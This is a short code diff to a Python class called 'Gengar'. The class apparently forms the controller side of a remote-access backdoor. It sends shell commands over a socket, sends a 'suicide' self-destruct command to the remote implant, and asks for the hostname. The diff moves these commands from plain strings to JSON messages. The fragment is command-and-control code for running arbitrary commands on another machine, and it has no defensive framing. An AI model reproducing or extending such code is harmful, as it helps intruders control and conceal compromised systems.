@@ -1,3 +1,6 @@
+import json
+
+
 class Gengar:
     def __init__(self, sock):
         self._sock = sock
@@ -9,11 +12,13 @@ class Gengar:
         return self._sock.recv(buff_size).decode().strip()
 
     def shell(self, cmd):
-        self._send(f'shell:{cmd}')
+        payload = json.dumps(dict(type='shell', content=cmd))
+        self._send(payload)
         return self._recv(4096)
 
     def suicide(self):
-        self._send('action:suicide')
+        payload = json.dumps(dict(type='suicide'))
+        self._send(payload)
         self._sock.close()
 
     def hostname(self):
